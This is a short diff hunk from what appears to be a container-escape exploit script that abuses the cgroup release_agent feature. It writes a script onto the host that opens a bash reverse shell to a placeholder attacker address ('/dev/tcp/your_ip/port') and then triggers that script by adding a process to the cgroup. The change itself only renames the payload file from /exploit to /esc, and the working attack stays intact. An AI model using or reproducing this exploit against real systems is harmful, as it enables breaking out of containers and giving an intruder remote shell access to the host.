@@ -19,9 +19,9 @@ host_path=$(sed -n 's/.*\perdir=\([^,]*\).*/\1/p' /etc/mtab)
 echo "$host_path/exploit" > /tmp/cgrp/release_agent
 
 # Create the exploit script on the host
-echo '#!/bin/sh' > /exploit
-echo "/bin/bash -c 'bash -i >& /dev/tcp/"your_ip"/"port" 0>&1'" >> /exploit
-chmod a+x /exploit
+echo '#!/bin/sh' > /esc
+echo "/bin/bash -c 'bash -i >& /dev/tcp/"your_ip"/"port" 0>&1'" >> /esc
+chmod a+x /esc
 
 # Trigger the exploit by adding a process to the cgroup
 sh -c "echo \$\$ > /tmp/cgrp/x/cgroup.procs"
